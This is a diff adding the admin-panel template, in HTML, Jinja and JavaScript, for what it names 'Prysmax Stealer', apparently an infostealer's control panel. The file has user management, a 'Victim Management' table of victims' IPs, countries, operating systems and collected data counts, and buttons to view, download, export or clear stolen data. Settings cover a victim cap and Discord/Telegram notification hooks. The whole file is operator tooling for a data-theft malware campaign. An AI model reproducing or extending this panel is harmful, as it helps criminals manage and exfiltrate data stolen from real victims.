@@ -1,0 +1,506 @@
+{% extends "base.html" %}
+
+{% block title %}Admin Panel - Prysmax{% endblock %}
+
+{% block content %}
+<div class="admin-panel-page">
+    <div class="page-header">
+        <h1><i class="fas fa-cogs"></i> Admin Panel</h1>
+        <p>System administration and user management</p>
+    </div>
+    
+    <!-- Admin Tabs -->
+    <div class="admin-tabs">
+        <button class="tab-btn active" onclick="showTab('users')">
+            <i class="fas fa-users"></i>
+            User Management
+        </button>
+        <button class="tab-btn" onclick="showTab('victims')">
+            <i class="fas fa-desktop"></i>
+            Victim Management
+        </button>
+        <button class="tab-btn" onclick="showTab('system')">
+            <i class="fas fa-server"></i>
+            System Settings
+        </button>
+        <button class="tab-btn" onclick="showTab('security')">
+            <i class="fas fa-shield-alt"></i>
+            Security
+        </button>
+    </div>
+    
+    <!-- User Management Tab -->
+    <div id="users-tab" class="tab-content active">
+        <div class="section-card">
+            <div class="section-header">
+                <h3>User Management</h3>
+                <button class="btn btn-primary" onclick="showAddUserModal()">
+                    <i class="fas fa-plus"></i>
+                    Add User
+                </button>
+            </div>
+            
+            <div class="users-table-container">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Username</th>
+                            <th>Email</th>
+                            <th>Role</th>
+                            <th>Status</th>
+                            <th>Last Login</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for user in users %}
+                        <tr>
+                            <td>{{ user.id }}</td>
+                            <td>
+                                <div class="user-info">
+                                    <div class="user-avatar">
+                                        {{ user.username[0].upper() }}
+                                    </div>
+                                    <span>{{ user.username }}</span>
+                                </div>
+                            </td>
+                            <td>{{ user.email or 'N/A' }}</td>
+                            <td>
+                                <span class="role-badge role-{{ 'admin' if user.is_admin else 'user' }}">
+                                    {{ 'Administrator' if user.is_admin else 'User' }}
+                                </span>
+                            </td>
+                            <td>
+                                <span class="status-badge status-active">
+                                    Active
+                                </span>
+                            </td>
+                            <td>{{ user.created_at.strftime('%Y-%m-%d %H:%M') if user.created_at else 'Unknown' }}</td>
+                            <td>
+                                <div class="action-buttons">
+                                    <button class="action-btn edit" onclick="editUser({{ user.id }})">
+                                        <i class="fas fa-edit"></i>
+                                    </button>
+                                    <button class="action-btn delete" onclick="deleteUser({{ user.id }})">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="7" class="no-data">
+                                <div class="empty-state">
+                                    <i class="fas fa-users"></i>
+                                    <h3>No users found</h3>
+                                    <p>Add your first user to get started</p>
+                                </div>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Victim Management Tab -->
+    <div id="victims-tab" class="tab-content">
+        <div class="section-card">
+            <div class="section-header">
+                <h3>Victim Management</h3>
+                <div class="victim-controls">
+                    <button class="btn btn-secondary" onclick="exportVictims()">
+                        <i class="fas fa-download"></i>
+                        Export
+                    </button>
+                    <button class="btn btn-danger" onclick="clearVictims()">
+                        <i class="fas fa-trash"></i>
+                        Clear All
+                    </button>
+                </div>
+            </div>
+            
+            <div class="victims-table-container">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>Victim ID</th>
+                            <th>IP Address</th>
+                            <th>Country</th>
+                            <th>OS</th>
+                            <th>First Seen</th>
+                            <th>Last Seen</th>
+                            <th>Data Count</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for victim in victims %}
+                        <tr>
+                            <td class="victim-id">{{ victim.victim_id }}</td>
+                            <td>{{ victim.ip_address }}</td>
+                            <td>
+                                <div class="country-info">
+                                    <span class="flag">🌍</span>
+                                    <span>{{ victim.country or 'Unknown' }}</span>
+                                </div>
+                            </td>
+                            <td>{{ victim.os or 'Unknown' }}</td>
+                            <td>{{ victim.first_seen.strftime('%Y-%m-%d %H:%M') if victim.first_seen else 'N/A' }}</td>
+                            <td>{{ victim.last_seen.strftime('%Y-%m-%d %H:%M') if victim.last_seen else 'N/A' }}</td>
+                            <td>
+                                <span class="data-count">{{ victim.data_count or 0 }}</span>
+                            </td>
+                            <td>
+                                <div class="action-buttons">
+                                    <button class="action-btn view" onclick="viewVictim('{{ victim.victim_id }}')">
+                                        <i class="fas fa-eye"></i>
+                                    </button>
+                                    <button class="action-btn download" onclick="downloadVictimData('{{ victim.victim_id }}')">
+                                        <i class="fas fa-download"></i>
+                                    </button>
+                                    <button class="action-btn delete" onclick="deleteVictim('{{ victim.victim_id }}')">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
+                            </td>
+                        </tr>
+                        {% else %}
+                        <tr>
+                            <td colspan="8" class="no-data">
+                                <div class="empty-state">
+                                    <i class="fas fa-desktop"></i>
+                                    <h3>No victims found</h3>
+                                    <p>Victim data will appear here when available</p>
+                                </div>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <!-- System Settings Tab -->
+    <div id="system-tab" class="tab-content">
+        <div class="settings-grid">
+            <div class="setting-card">
+                <h3>General Settings</h3>
+                <div class="setting-item">
+                    <label>Application Name</label>
+                    <input type="text" value="Prysmax Stealer" class="setting-input">
+                </div>
+                <div class="setting-item">
+                    <label>Max Victims</label>
+                    <input type="number" value="10000" class="setting-input">
+                </div>
+                <div class="setting-item">
+                    <label>Auto-cleanup</label>
+                    <div class="toggle-switch">
+                        <input type="checkbox" id="auto-cleanup" checked>
+                        <label for="auto-cleanup"></label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="setting-card">
+                <h3>Notification Settings</h3>
+                <div class="setting-item">
+                    <label>Discord Webhook</label>
+                    <input type="url" placeholder="https://discord.com/api/webhooks/..." class="setting-input">
+                </div>
+                <div class="setting-item">
+                    <label>Telegram Bot Token</label>
+                    <input type="text" placeholder="Bot token" class="setting-input">
+                </div>
+                <div class="setting-item">
+                    <label>Email Notifications</label>
+                    <div class="toggle-switch">
+                        <input type="checkbox" id="email-notifications">
+                        <label for="email-notifications"></label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="setting-card">
+                <h3>Security Settings</h3>
+                <div class="setting-item">
+                    <label>Session Timeout (minutes)</label>
+                    <input type="number" value="60" class="setting-input">
+                </div>
+                <div class="setting-item">
+                    <label>Two-Factor Authentication</label>
+                    <div class="toggle-switch">
+                        <input type="checkbox" id="two-factor">
+                        <label for="two-factor"></label>
+                    </div>
+                </div>
+                <div class="setting-item">
+                    <label>IP Whitelist</label>
+                    <textarea class="setting-textarea" placeholder="Enter IP addresses, one per line"></textarea>
+                </div>
+            </div>
+        </div>
+        
+        <div class="settings-actions">
+            <button class="btn btn-secondary" onclick="resetSettings()">
+                <i class="fas fa-undo"></i>
+                Reset to Defaults
+            </button>
+            <button class="btn btn-primary" onclick="saveSettings()">
+                <i class="fas fa-save"></i>
+                Save Settings
+            </button>
+        </div>
+    </div>
+    
+    <!-- Security Tab -->
+    <div id="security-tab" class="tab-content">
+        <div class="security-grid">
+            <div class="security-card">
+                <h3>Access Logs</h3>
+                <div class="log-list">
+                    <div class="log-item">
+                        <div class="log-info">
+                            <span class="log-time">2025-07-03 00:09:54</span>
+                            <span class="log-action">Login</span>
+                            <span class="log-user">admin</span>
+                        </div>
+                        <span class="log-ip">192.168.1.10</span>
+                    </div>
+                    <div class="log-item">
+                        <div class="log-info">
+                            <span class="log-time">2025-07-03 00:08:32</span>
+                            <span class="log-action">Settings Changed</span>
+                            <span class="log-user">admin</span>
+                        </div>
+                        <span class="log-ip">192.168.1.10</span>
+                    </div>
+                    <div class="log-item">
+                        <div class="log-info">
+                            <span class="log-time">2025-07-03 00:05:15</span>
+                            <span class="log-action">User Created</span>
+                            <span class="log-user">admin</span>
+                        </div>
+                        <span class="log-ip">192.168.1.10</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="security-card">
+                <h3>Security Status</h3>
+                <div class="security-status">
+                    <div class="status-item">
+                        <i class="fas fa-shield-alt status-icon secure"></i>
+                        <span>SSL Certificate</span>
+                        <span class="status-badge secure">Active</span>
+                    </div>
+                    <div class="status-item">
+                        <i class="fas fa-lock status-icon secure"></i>
+                        <span>Database Encryption</span>
+                        <span class="status-badge secure">Enabled</span>
+                    </div>
+                    <div class="status-item">
+                        <i class="fas fa-user-shield status-icon warning"></i>
+                        <span>Two-Factor Auth</span>
+                        <span class="status-badge warning">Disabled</span>
+                    </div>
+                    <div class="status-item">
+                        <i class="fas fa-network-wired status-icon secure"></i>
+                        <span>Firewall</span>
+                        <span class="status-badge secure">Active</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Add User Modal -->
+<div id="addUserModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Add New User</h3>
+            <button class="modal-close" onclick="closeAddUserModal()">&times;</button>
+        </div>
+        <div class="modal-body">
+            <form id="addUserForm">
+                <div class="form-group">
+                    <label>Username</label>
+                    <input type="text" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label>Email</label>
+                    <input type="email" name="email">
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" required>
+                </div>
+                <div class="form-group">
+                    <label>Role</label>
+                    <select name="role">
+                        <option value="user">User</option>
+                        <option value="admin">Admin</option>
+                    </select>
+                </div>
+                <div class="form-actions">
+                    <button type="button" class="btn btn-secondary" onclick="closeAddUserModal()">Cancel</button>
+                    <button type="submit" class="btn btn-primary">Add User</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function showTab(tabName) {
+    // Hide all tabs
+    document.querySelectorAll('.tab-content').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    
+    // Remove active class from all buttons
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    
+    // Show selected tab
+    document.getElementById(tabName + '-tab').classList.add('active');
+    event.target.classList.add('active');
+}
+
+function showAddUserModal() {
+    document.getElementById('addUserModal').style.display = 'flex';
+}
+
+function closeAddUserModal() {
+    document.getElementById('addUserModal').style.display = 'none';
+}
+
+function editUser(userId) {
+    // Implement user editing
+    console.log('Edit user:', userId);
+}
+
+function deleteUser(userId) {
+    if (confirm('Are you sure you want to delete this user?')) {
+        fetch(`/api/users/${userId}`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to delete user: ' + data.message);
+                }
+            });
+    }
+}
+
+function viewVictim(victimId) {
+    window.open(`/victim/${victimId}`, '_blank');
+}
+
+function downloadVictimData(victimId) {
+    window.open(`/api/victims/${victimId}/download`, '_blank');
+}
+
+function deleteVictim(victimId) {
+    if (confirm('Are you sure you want to delete this victim data?')) {
+        fetch(`/api/victims/${victimId}`, { method: 'DELETE' })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to delete victim: ' + data.message);
+                }
+            });
+    }
+}
+
+function exportVictims() {
+    window.open('/api/victims/export', '_blank');
+}
+
+function clearVictims() {
+    if (confirm('Are you sure you want to clear all victim data? This action cannot be undone.')) {
+        fetch('/api/victims/clear', { method: 'POST' })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to clear victims: ' + data.message);
+                }
+            });
+    }
+}
+
+function saveSettings() {
+    // Collect all settings
+    const settings = {};
+    document.querySelectorAll('.setting-input, .setting-textarea').forEach(input => {
+        settings[input.name || input.id] = input.value;
+    });
+    
+    // Save settings
+    fetch('/api/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(settings)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            alert('Settings saved successfully!');
+        } else {
+            alert('Failed to save settings: ' + data.message);
+        }
+    });
+}
+
+function resetSettings() {
+    if (confirm('Are you sure you want to reset all settings to defaults?')) {
+        fetch('/api/settings/reset', { method: 'POST' })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    location.reload();
+                } else {
+                    alert('Failed to reset settings: ' + data.message);
+                }
+            });
+    }
+}
+
+// Add User Form Handler
+document.getElementById('addUserForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const formData = new FormData(this);
+    const userData = Object.fromEntries(formData);
+    
+    fetch('/api/users', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(userData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            closeAddUserModal();
+            location.reload();
+        } else {
+            alert('Failed to add user: ' + data.message);
+        }
+    });
+});
+</script>
+{% endblock %}
+
